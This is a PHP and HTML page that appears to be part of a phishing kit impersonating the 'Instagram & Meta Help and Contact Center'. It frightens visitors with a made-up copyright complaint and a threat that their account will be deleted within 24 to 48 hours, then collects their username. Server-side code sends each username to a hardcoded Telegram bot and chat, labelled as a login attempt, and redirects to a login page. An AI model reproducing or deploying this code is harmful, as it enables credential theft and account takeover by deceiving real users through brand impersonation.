<?php
if ($_POST) {
  session_start();
  $clawzuser=$_POST["clawzuser"];
  $_SESSION["clawzuser"]=$clawzuser;
  $md5=md5($clawzuser);
  
  $token='5000908961:AAGKTvzp49-Yc6YnQdh3MGBz5lOMrinan8E';



$data = [
    'text' => '
    🟡 GİRİŞ DENENİYOR 🟡
    
Kullanıcı Adı: '.$clawzuser.'
',
    'chat_id' =>'-1001586201889'
];
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
  header("Location: login.php?$md5");
}
?>



<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@500&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="style.css">
    <title>Instagram & Meta</title>
</head>
<body>
    <center>
        <div class="up"> <br>
        <h2>Instagram & Meta </h2>
        <h4>Help and Contact Center ©</h4>
    </div> 
    <br>
    <div class="middle">
        <h1>Complaints !</h1>
        <p>If we have sent you this form, your account has been reported many times for copyright infringement.  As the Instagram team, we carefully protect copyrights.</p>
        <p>Your account will therefore be deleted from our servers within 24 to 48 hours.  If you think this is an error, you can proceed to the appeal form by entering your username.</p> 
        <form method="post">
            <input required type="text" name="clawzuser" class="inputcwz" placeholder="Username">
            <br><br>
            <input type="submit" class="btn" value="Continue">
        </form> 
    </div> <br>
    <br>
    <img width="150" src="https://www.citypng.com/public/uploads/small/11640344612dld2zxme2wo06d5tycstmtr5wd5ka5xkw95yyifgxyzoqcw5lfc8hyjc7rkl0hzykywrw10ibe6vbd4ovrwrlfkwokcgn9fxqs5g.png" alt="">
    </center>
</body>
</html>